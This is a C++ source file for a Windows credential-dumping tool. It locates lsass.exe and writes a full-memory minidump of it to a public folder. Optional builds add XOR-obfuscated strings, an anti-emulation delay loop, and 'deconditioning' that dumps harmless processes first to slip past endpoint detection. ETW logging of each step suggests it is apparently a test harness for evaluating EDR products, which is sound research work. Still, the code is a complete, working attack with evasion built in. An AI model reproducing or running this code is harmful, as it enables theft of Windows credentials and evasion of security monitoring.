#include <windows.h>
#include <dbghelp.h>
#include <tlhelp32.h>
#include <chrono>
#include <iostream>
#include <iomanip>
#include <fstream>
#include <sstream>
#include <thread>
#include <vector>
#include <TraceLoggingProvider.h>

#pragma comment(lib, "dbghelp.lib")

// my attack provider
TRACELOGGING_DEFINE_PROVIDER(
    g_hProvider,
    "Attack-Provider", // name in the ETW
    (0x72248466, 0x7166, 0x4feb, 0xa3, 0x86, 0x34, 0xd8, 0xf3, 0x5b, 0xb6, 0x37)  // a random GUID
);

int sleep_between_steps_ms = 980; // time to wait between attack steps

UINT64 get_ns_time() {
    auto now = std::chrono::system_clock::now();
    return std::chrono::duration_cast<std::chrono::nanoseconds>(now.time_since_epoch()).count();
}

void print_and_emit_event(std::string msg, std::string pre) {
	UINT64 ns = get_ns_time();
    TraceLoggingWrite(
        g_hProvider,
        "AttackTask", // this is the event name
		TraceLoggingValue(msg.c_str(), "message"),
		TraceLoggingUInt64(ns, "ns_since_epoch")
    );
    std::cout << pre << msg << "\n";
}

typedef BOOL(WINAPI* MyDumpPtr)(
    HANDLE        hProcess,
    DWORD         ProcessId,
    HANDLE        hFile,
    MINIDUMP_TYPE DumpType,
    PVOID         ExceptionParam,
    PVOID         UserStreamParam,
    PVOID         CallbackParam
    );

int main(int argc, char** argv) {
    // start ETW provider
    TraceLoggingRegister(g_hProvider);

    std::ostringstream msg;
    std::string bef = "[<] ";
    std::string aft = "[>]  ";
    std::string fail = "[!] ";
    std::string ok = "[+] ";

    // antiEmulation should be one of the first actions in the EXE
    // deconditioning depends on anti_emulation + obfuscation (anti-signature)
#if defined antiEmulation || defined deconditioning
    msg << "Doing anti emulation calc operations for about 5 sec";
    print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
    auto start_ae_calc = std::chrono::high_resolution_clock::now();
    volatile bool dummy_ae_calc; // do no optimze "calc prime" loop away
    for (UINT64 n = 2; n <= 10'000'000; ++n) { bool pr = true; for (UINT64 i = 2; i * i <= n; ++i) { if (n % i == 0) { pr = false; break; } } dummy_ae_calc = pr; }
    auto end_ae_calc = std::chrono::high_resolution_clock::now();
    auto ae_calc_elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(end_ae_calc - start_ae_calc).count();
    msg << "Calculated for approximately " << ae_calc_elapsed << " ms";
    print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
#endif

    // print current 
    msg << "Reader started with PID " << GetCurrentProcessId();
    print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
    Sleep(sleep_between_steps_ms);

    // handle config selection
    msg << "Running '";
#if defined standard
    msg << "standard";
#elif defined obfuscation
    msg << "obfuscation";
#elif defined antiEmulation
    msg << "antiEmulation+obfuscation";
#elif defined deconditioning
    msg << "deconditioning+antiEmulation+obfuscation";
#else
    msg << "Release";

    // handle start params only in 'Release' config
    enum StartupMode { NoWait, WaitTime, WaitForEnter };
    StartupMode s = NoWait;
    int wait_time = 5;
    if (argc >= 2) {
        if (strcmp(argv[1], "--wait") == 0) {
            s = WaitTime;
        }
        if (strcmp(argv[1], "--wait-enter") == 0) {
            s = WaitForEnter;
        }
    }

    switch (s) {
    case NoWait:
        break;
    case WaitTime:
        for (int i = wait_time; i > 0; i--) {
            std::cout << "[*] Starting reader in " << i << "\n";
            Sleep(1000);
        };
        break;
    case WaitForEnter:
        std::cout << "[*] Press ENTER to read...\n";
        std::cin.get();
    default:
        break;
    }
#endif
    msg << "' config";
    print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();

    msg << "Before creating proc snapshot";
    print_and_emit_event(msg.str(), bef); msg.str({}); msg.clear();

    // create a snapshot of running procs
    DWORD pid = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        msg << "CreateToolhelp failed";
        print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
        Sleep(sleep_between_steps_ms);
        return 1;
    }
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);

    msg << "After creating proc snapshot";
    print_and_emit_event(msg.str(), aft); msg.str({}); msg.clear();
    Sleep(sleep_between_steps_ms);

    // init strings
    // antiemulation and deconditioning also depend on obfuscation (anti signature)
#if defined obfuscation || defined antiEmulation || defined deconditioning
    msg << "Before decrypting strings";
    print_and_emit_event(msg.str(), bef); msg.str({}); msg.clear();

    // https://cyberchef.org/#recipe=Unescape_string()XOR(%7B'option':'UTF8','string':'AB'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=QzpcXFVzZXJzXFxQdWJsaWNcXERvd25sb2Fkc1xcdGVzdC5kbXBcMA
    BYTE outFileBytes[] = { 0x02,0x78,0x1d,0x17,0x32,0x27,0x33,0x31,0x1d,0x12,0x34,0x20,0x2d,0x2b,0x22,0x1e,0x05,0x2d,0x36,0x2c,0x2d,0x2d,0x20,0x26,0x32,0x1e,0x2d,0x6c,0x25,0x2f,0x31,0x42 };
    for (size_t i = 0; i < sizeof(outFileBytes); ++i) { outFileBytes[i] ^= ((i & 1) == 0 ? 0x41 : 0x42); }

    // https://cyberchef.org/#recipe=Unescape_string()XOR(%7B'option':'UTF8','string':'AB'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=ZGJnaGVscC5kbGw
    BYTE dumpLibraryBytes[] = { 0x27,0x26,0x24,0x2c,0x26,0x28,0x33,0x6a,0x27,0x28,0x2f };
    for (size_t i = 0; i < sizeof(dumpLibraryBytes); ++i) { dumpLibraryBytes[i] ^= ((i & 1) == 0 ? 0x43 : 0x44); }

    // https://cyberchef.org/#recipe=Unescape_string()XOR(%7B'option':'UTF8','string':'AB'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=TWluaUR1bXBXcml0ZUR1bXBcMA
    BYTE dumpFunctionBytes[] = { 0x0e,0x2d,0x2d,0x2d,0x07,0x31,0x2e,0x34,0x14,0x36,0x2a,0x30,0x26,0x00,0x36,0x29,0x33,0x44 };
    for (size_t i = 0; i < sizeof(dumpFunctionBytes); ++i) { dumpFunctionBytes[i] ^= ((i & 1) == 0 ? 0x43 : 0x44); }

    msg << "After decrypting strings";
    print_and_emit_event(msg.str(), aft); msg.str({}); msg.clear();
    Sleep(sleep_between_steps_ms);
#else
    // literal strings -> already \0 terminated
    BYTE outFileBytes[] = "C:\\Users\\Public\\Downloads\\l.dmp"; 
    BYTE dumpLibraryBytes[] = "dbghelp.dll";
    BYTE dumpFunctionBytes[] = "MiniDumpWriteDump";
#endif

    char* outFile = reinterpret_cast<char*>(outFileBytes);
    char* dumpLibrary = reinterpret_cast<char*>(dumpLibraryBytes);
    char* dumpFunction = reinterpret_cast<char*>(dumpFunctionBytes);

    msg << "Before opening out file";
    print_and_emit_event(msg.str(), bef); msg.str({}); msg.clear();

    // open handle to dump file (overwrite if exists)
    HANDLE hFile = CreateFileA(outFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        msg << "Failed to open out file: " << GetLastError();
        print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
        return 1;
    }

    msg << "After opening out file handle";
    print_and_emit_event(msg.str(), aft); msg.str({}); msg.clear();
    Sleep(sleep_between_steps_ms);

    msg << "Before resolving function";
    print_and_emit_event(msg.str(), bef); msg.str({}); msg.clear();

    // resolving functions
    HMODULE hLib = LoadLibraryA(dumpLibrary);
    if (!hLib) {
        msg << "Failed to load lib " << dumpLibrary << ": " << GetLastError();
        print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
        CloseHandle(hFile);
        return 1;
    }
    MyDumpPtr MiniDWriteD = (MyDumpPtr)GetProcAddress(hLib, dumpFunction);
    if (!MiniDWriteD) {
        msg << "Failed to get function addr " << dumpFunction << ": " << GetLastError();
        print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
        CloseHandle(hFile);
        return 1;
    }

    msg << "After resolving function";
    print_and_emit_event(msg.str(), aft); msg.str({}); msg.clear();
    Sleep(sleep_between_steps_ms);

#if defined deconditioning // https://github.com/dobin/SuperMega/blob/main/data/source/antiemulation/sirallocalot.c
    msg << "Starting deconditioning";
    print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();

    constexpr int dumps = 20;
    std::vector<std::wstring> procsDump = {
        L"audiodg.exe", L"explorer.exe", L"cftmon.exe", L"StartMenuExperienceHost.exe"
    };
    int i = 0;
    while (i < dumps) { // repeat until target number reached
        int prev = i;
        if (Process32First(snap, &pe)) {
            do {
                // only dump "non important" procs, do not raise alerts here
                if (std::find(procsDump.begin(), procsDump.end(), pe.szExeFile) != procsDump.end()) {

                    HANDLE hDecon = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
                    if (hDecon == NULL) {
                        continue; // ignore errors, just open+dump as many procs as possible (except lsass)
                    }
                    msg << "Dumping " << pe.th32ProcessID;
                    print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();

                    // blindly dump and overwrite
                    MiniDWriteD(hDecon, pid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
                    // and close proc handle again
                    CloseHandle(hDecon);
                    i++;
                }
            } while (Process32Next(snap, &pe) && i < dumps);
        }
        if (i == prev) {
            msg << "Unable to dump any proc";
            print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
            break; // unable to dump any proc, break
        }
    }

    msg << "Finished deconditioning, dumped " << i << " procs";
    print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
    Sleep(sleep_between_steps_ms * 5); // 
#endif

    // init strings
    // antiemulation and deconditioning also depend on obfuscation (anti signature)
#if defined obfuscation || defined antiEmulation || defined deconditioning
    msg << "Before decrypting target proc string";
    print_and_emit_event(msg.str(), bef); msg.str({}); msg.clear();

    // https://cyberchef.org/#recipe=Unescape_string()Encode_text('UTF-16LE%20(1200)')XOR(%7B'option':'UTF8','string':'AB'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=bHNhc3MuZXhlXDA
    BYTE procBytes[] = { 0x2f,0x44,0x30,0x44,0x22,0x44,0x30,0x44,0x30,0x44,0x6d,0x44,0x26,0x44,0x3b,0x44,0x26,0x44,0x43,0x44 };
    for (size_t i = 0; i < sizeof(procBytes); ++i) { procBytes[i] ^= ((i & 1) == 0 ? 0x43 : 0x44); }

    msg << "After decrypting target proc string";
    print_and_emit_event(msg.str(), aft); msg.str({}); msg.clear();
    Sleep(sleep_between_steps_ms);
#else
    BYTE procBytes[] = { 0x6c,0x00,0x73,0x00,0x61,0x00,0x73,0x00,0x73,0x00,0x2e,0x00,0x65,0x00,0x78,0x00,0x65,0x00,0x00,0x00 }; // https://cyberchef.org/#recipe=Unescape_string()Encode_text('UTF-16LE%20(1200)')To_Hex('0x%20with%20comma',0)&input=bHNhc3MuZXhlXDA
#endif

    wchar_t* procW = reinterpret_cast<wchar_t*>(procBytes);

    // find lsass's PID (but do not interact with it yet!)
    msg << "Before finding pid";
    print_and_emit_event(msg.str(), bef); msg.str({}); msg.clear();

    if (Process32First(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, procW) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(snap, &pe));
    }
    if (pid != 0) {
        msg << "After finding pid: " << pid;
        print_and_emit_event(msg.str(), aft); msg.str({}); msg.clear();
        Sleep(sleep_between_steps_ms);
    }
    else {
        msg << "Unable to find pid";
        print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
        Sleep(sleep_between_steps_ms);
        CloseHandle(hFile);
        return 1;
    }

    msg << "Before opening process handle";
    print_and_emit_event(msg.str(), bef); msg.str({}); msg.clear();

    // open process with all access
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        msg << "Failed to open process: " << GetLastError();
        print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
        CloseHandle(hFile);
        return 1;
    }

    msg << "After opening process handle";
    print_and_emit_event(msg.str(), aft); msg.str({}); msg.clear();
    Sleep(sleep_between_steps_ms);

    msg << "Before creating dump";
    print_and_emit_event(msg.str(), bef); msg.str({}); msg.clear();

    // create mini dump of proc
    if (!MiniDWriteD(hProcess, pid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL)) {
        msg << "Failed to create dump: " << GetLastError();
        print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
    }
    else {
        msg << "After creating dump";
        print_and_emit_event(msg.str(), aft); msg.str({}); msg.clear();
        Sleep(sleep_between_steps_ms);
    }
    
    CloseHandle(hProcess);
    CloseHandle(hFile);

    msg << "Attack done";
    print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
    TraceLoggingUnregister(g_hProvider);
    return 0;
}
